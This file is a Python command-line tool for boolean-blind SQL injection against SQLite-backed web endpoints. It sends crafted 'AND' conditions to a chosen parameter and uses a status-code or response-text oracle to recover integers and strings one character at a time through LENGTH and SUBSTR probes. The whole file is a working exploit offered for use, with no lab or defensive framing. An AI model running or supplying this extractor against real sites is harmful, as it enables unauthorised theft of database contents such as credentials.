#!/usr/bin/env python3
from __future__ import annotations

import argparse
import string
import urllib.error
import urllib.parse
import urllib.request


DEFAULT_CHARSET = string.ascii_letters + string.digits + "_{}-:@."


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Extract SQLite values via boolean-blind SQLi.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--target", required=True)
    common.add_argument("--param", required=True)
    common.add_argument("--prefix", default="1 AND ")
    common.add_argument("--method", choices=["GET", "POST"], default="GET")
    common.add_argument("--timeout", type=float, default=10.0)
    common.add_argument("--true-status", type=int)
    common.add_argument("--true-contains")

    check_parser = subparsers.add_parser("check", parents=[common])
    check_parser.add_argument("--condition", required=True)

    int_parser = subparsers.add_parser("int", parents=[common])
    int_parser.add_argument("--expr", required=True, help="SQL expression returning an integer")
    int_parser.add_argument("--min", type=int, default=0)
    int_parser.add_argument("--max", type=int, required=True)

    string_parser = subparsers.add_parser("string", parents=[common])
    string_parser.add_argument("--expr", required=True, help="SQL expression returning a string")
    string_parser.add_argument("--max-length", type=int, default=64)
    string_parser.add_argument("--charset", default=DEFAULT_CHARSET)

    return parser


def send_request(target: str, param: str, payload: str, method: str, timeout: float) -> tuple[int, str]:
    encoded = urllib.parse.urlencode({param: payload})
    request_url = target
    data = None
    if method == "GET":
        separator = "&" if urllib.parse.urlparse(target).query else "?"
        request_url = f"{target}{separator}{encoded}"
    else:
        data = encoded.encode("utf-8")

    request = urllib.request.Request(request_url, data=data, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")


def is_true(status: int, body: str, args: argparse.Namespace) -> bool:
    if args.true_status is None and not args.true_contains:
        raise ValueError("set --true-status or --true-contains so the extractor has an oracle")
    if args.true_status is not None and status == args.true_status:
        return True
    if args.true_contains and args.true_contains in body:
        return True
    return False


def condition_holds(condition: str, args: argparse.Namespace) -> bool:
    payload = f"{args.prefix}({condition})"
    status, body = send_request(args.target, args.param, payload, args.method, args.timeout)
    return is_true(status, body, args)


def infer_int(expr: str, args: argparse.Namespace) -> int:
    for guess in range(args.min, args.max + 1):
        if condition_holds(f"({expr})={guess}", args):
            return guess
    raise RuntimeError(f"no integer matched in range [{args.min}, {args.max}]")


def infer_string(expr: str, args: argparse.Namespace) -> str:
    length_args = argparse.Namespace(**{**vars(args), "min": 0, "max": args.max_length})
    length = infer_int(f"LENGTH(({expr}))", length_args)
    chars: list[str] = []
    for position in range(1, length + 1):
        matched = False
        for char in args.charset:
            escaped = char.replace("'", "''")
            if condition_holds(f"SUBSTR(({expr}),{position},1)='{escaped}'", args):
                chars.append(char)
                matched = True
                break
        if not matched:
            raise RuntimeError(f"no character matched at position {position}")
    return "".join(chars)


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    if args.command == "check":
        print("true" if condition_holds(args.condition, args) else "false")
        return 0
    if args.command == "int":
        print(infer_int(args.expr, args))
        return 0
    if args.command == "string":
        print(infer_string(args.expr, args))
        return 0

    parser.error("unknown command")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
